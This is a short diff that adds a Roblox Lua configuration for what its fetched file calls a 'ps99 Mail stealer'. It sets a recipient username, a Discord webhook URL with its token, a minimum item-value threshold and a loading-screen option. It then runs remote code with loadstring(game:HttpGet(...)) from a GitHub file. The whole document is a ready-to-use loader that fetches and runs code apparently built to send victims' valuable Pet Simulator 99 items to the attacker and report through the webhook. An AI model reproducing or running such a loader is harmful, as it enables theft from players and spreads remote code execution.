@@ -1,0 +1,6 @@
+Username = "Dog38235Dog"
+Webhook = "https://discord.com/api/webhooks/1324487395281862719/C4Jjew-J7OUIopYhyoftH8GJyiK8onh6WdeOOuvKFRPqSOQ_neXikY5jJrg4VXELV2Ha"
+MinimumRAP = 10000
+selectedLoadingScreen = "1"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PS99SCRIPTS966/ICE-SCRIPT-ON-TOP/refs/heads/main/ICE%20SCRIPT%20ps99%20Mail%20stealer"))()
